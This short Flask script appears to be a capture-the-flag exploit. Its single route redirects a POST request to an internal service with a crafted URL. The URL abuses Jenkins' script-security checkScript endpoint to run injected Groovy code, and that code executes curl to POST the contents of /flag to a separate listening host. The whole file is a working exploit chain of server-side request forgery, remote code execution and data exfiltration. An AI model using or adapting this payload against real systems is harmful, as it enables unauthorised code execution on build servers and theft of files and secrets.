from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/redirect', methods=['POST'])
def redi():
    return redirect('http://10.207.127.144:32810/?redirect_url=http%3A%2F%2Fjenkins%3A8080%2FsecurityRealm%2Fuser%2Fadmin%2FdescriptorByName%2Forg.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript%2FcheckScript%3Fsandbox%3Dtrue%26value%3Dpublic%20class%20x%20%7Bpublic%20x()%7B%22curl%20-X%20POST%20-d%20%40%2Fflag%20http%3A%2F%2F10.207.127.144:39475/%22.execute()%7D%7D',code=302)

if __name__ == '__main__':
    app.run(debug=True,host="0.0.0.0",port=31801)

